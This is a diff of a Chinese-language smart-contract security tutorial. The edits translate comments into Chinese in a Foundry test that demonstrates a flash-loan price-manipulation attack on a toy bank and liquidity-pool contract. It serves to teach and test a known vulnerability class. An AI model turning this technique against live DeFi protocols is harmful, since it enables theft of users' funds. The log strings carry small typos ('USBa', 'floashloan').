@@ -51,44 +51,44 @@ contract SimpleBank {
 
 ***\*测试方法:\****
 
-仿真测试--contracts src/test/**Price_manipulation.sol** -vvvv
+forge test--contracts src/test/**Price_manipulation.sol** -vvvv
 
 ```jsx
-// Function to test a potential price manipulation vulnerability
+// 测试潜在价格操纵漏洞的函数
     function testPrice_Manipulation() public {
-        // Transfers 9000 ether (using ether as a denomination here but it actually refers to the USDb token's smallest unit) to the SimpleBankContract from the USDbContract
+        // 将 9000 以太币（这里使用以太币作为面额，但实际上指的是 USDb 代币的最小单位）从 USDbContract 转移到 SimpleBankContract
         USDbContract.transfer(address(SimpleBankContract), 9000 ether);
         
-        // Transfers 1000 ether worth of USDa tokens to the SimplePoolContract from the USDaContract
+        // 将价值 1000 以太币的 USDa 代币从 USDaContract 转移到 SimplePoolContract
         USDaContract.transfer(address(SimplePoolContract), 1000 ether);
         
-        // Transfers 1000 ether worth of USDb tokens to the SimplePoolContract from the USDbContract
+        // 将价值 1000 以太币的 USDb 代币从 USDbContract 转移到 SimplePoolContract
         USDbContract.transfer(address(SimplePoolContract), 1000 ether);
         
-        // Retrieves the current price of USDa in terms of USDb from the SimplePoolContract
-        // Initially, the price is assumed to be 1 USDa : 1 USDb
+        // 从 SimplePoolContract 中检索以 USDb 表示的 USDa 的当前价格
+         // 最初，假设价格为 1 USDa : 1 USDb
         SimplePoolContract.getPrice(); // 1 USDa : 1 USDb
 
-        // Logs the assumption that the price of USDa is 1 to 1 USDb because the pool has 1000 of each
+        // 记录 USDa 价格为 1 比 1 USDb 的假设，因为池中各有 1000 个
         console.log(
             "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
         );
         
-        // Emits a log with the current USDa conversion rate
+        // 发出当前 USDa 汇率的日志
         emit log_named_decimal_uint(
             "Current USDa convert rate",
             SimplePoolContract.getPrice(),
             18
         );
         
-        // Logs the start of the price manipulation attempt
+        // 记录价格操纵尝试的开始
         console.log("Start price manipulation");
         
-        // Logs a message about borrowing 500 USDb via a flash loan
+        // 记录有关通过闪贷借入 500 美元的消息
         console.log("Borrow 500 USBa over floashloan");
         
-        // Attempts to manipulate the price by using a flash loan to borrow 500 USDb
-        // This could potentially distort the balance of USDa and USDb in the SimplePoolContract, affecting the price
+        // 尝试通过快速贷款借入 500 USDb 来操纵价格
+         // 这可能会扭曲 SimplePoolContract 中 USDa 和 USDb 的平衡，从而影响价格
         SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
     }
 ```
